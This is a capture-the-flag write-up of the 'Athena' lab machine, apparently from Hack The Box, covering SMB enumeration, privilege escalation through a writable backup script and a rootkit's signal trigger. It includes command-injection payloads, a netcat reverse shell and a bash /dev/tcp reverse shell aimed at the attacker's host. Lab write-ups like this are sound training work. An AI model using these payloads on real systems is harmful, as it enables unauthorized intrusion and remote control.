---
title: Athena @ HTB
date: 2023-12-21 17:00:00 +0000
categories: [Machines, HTB]
tags: [Athena]
math: true
mermaid: true
media_subpath: /assets/posts/2023-12-21-HTB-Athena
image:
  path: preview.png
---


# Athena

![53d3c28c1af197142685ceb238d5ce3c](https://github.com/7h30ry/Writeups/assets/51336409/fc9c112a-73f2-41f0-b002-3661fc7f41de)

## Port Sacn

![Screenshot from 2023-09-19 22-04-24](https://github.com/7h30ry/Writeups/assets/51336409/39514405-1cdc-4a53-bea7-3d1fcca9e2a2)

Seeing that there is port 80, i visited the web page

![Screenshot from 2023-09-19 22-06-23](https://github.com/7h30ry/Writeups/assets/51336409/8eec765a-3729-4c52-a694-6a1b11d6c0b4)

I searched through but not, so i checked the smb port
```
smbclient -L //ip//
```
![Screenshot from 2023-09-19 22-09-12](https://github.com/7h30ry/Writeups/assets/51336409/09c18c1b-f29f-402d-b665-882fefcad1dd)

```
smbclient //ip/public
```
![Screenshot from 2023-09-19 22-10-47](https://github.com/7h30ry/Writeups/assets/51336409/5c8f6bfc-36e2-4e2b-96e3-9ec88f4bf81c)

reading the msg_for_administrator.txt file

![Screenshot from 2023-09-19 22-12-41](https://github.com/7h30ry/Writeups/assets/51336409/e92a50ab-ec09-4c84-bf25-8be9b3ff8d52)

## Command Injection

So i visited the /myrouterpanel directory on the web

![Screenshot from 2023-09-19 22-14-29](https://github.com/7h30ry/Writeups/assets/51336409/68f6462c-d607-4a43-b6ae-23151c1d7b40)

Seeing this what came to my mind was Command injection

I firstly checked if the ping function was working

![Screenshot from 2023-09-19 22-16-13](https://github.com/7h30ry/Writeups/assets/51336409/997e0a70-a86d-447c-a861-872530e1ed5d)

Seeing that the ping is working i tried ```127.0.0.1;ls``` ```127.0.0.1| ls```  payload but it did not 

![Screenshot from 2023-09-19 22-18-25](https://github.com/7h30ry/Writeups/assets/51336409/0cf2028f-28e4-45de-9c1d-7dea43eee70e)

After some tries i was able to bypas it with
```
$(command)
```
so in order to get an RCE i used

```
$(nc <lhost> <lport> -e /bin/bash)
```

![Screenshot from 2023-09-19 22-22-37](https://github.com/7h30ry/Writeups/assets/51336409/9967ed89-3183-483b-ac03-a39523de82b3)

I tried accessing the /home/athena directory i keep getting Permission denied

## Privilege escalation to athena

```
find / -user 'athena' 2>/dev/null
```

![Screenshot from 2023-09-19 22-26-29](https://github.com/7h30ry/Writeups/assets/51336409/970f2897-c9e9-47b1-98ad-9a3972b727ba)

we se a /usr/share/backup directory which has a backup.sh file in it

![Screenshot from 2023-09-19 22-28-12](https://github.com/7h30ry/Writeups/assets/51336409/66c7cc7f-e418-4dc4-801f-63f1ac472904)

Guessing there is process runing the backup.sh file i decided to add a reverse shell inside the backup.sh file

```
echo 'bash -i >& /dev/tcp/<lhost>/4444 0>&1' >> backup.sh
```
start a listener on 4444

After a while i got a reverse shell as athena

![Screenshot from 2023-09-19 22-28-12](https://github.com/7h30ry/Writeups/assets/51336409/9b6a1bec-64d3-4b4a-bbb3-5d6804f27577)


## Root

Trying sudo -l

![Screenshot from 2023-09-19 22-34-14](https://github.com/7h30ry/Writeups/assets/51336409/dd87a0a5-3129-4aea-b358-3db14e2b2ca8)

we see that we can run 
```(root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko```

## USE Ghidra: to reverse the venom.ko file

after some reversing, we notice the ```hacked_kill``` function :

![ghidra](https://github.com/7h30ry/Writeups/assets/51336409/15e74320-f334-41f6-a6e0-88ecebf345b2)

we see that in order for give_root() to get called, we need to send a signal 57 instead of 64 as mentioned in the github repository, so this rootkit was slightly modified, let's try again with signal 57 :

the give_root function may work like this kill -57 <pid>, later on the id command reveals that you have root access.

so i started a process with 
```sleep 10 &```

got the process id and typed
```kill -57 -pid```

![Screenshot from 2023-09-19 22-44-19](https://github.com/7h30ry/Writeups/assets/51336409/395a52fb-bc72-4ec9-9ea5-e1d5334e4e75)

Now we got Root !!! 












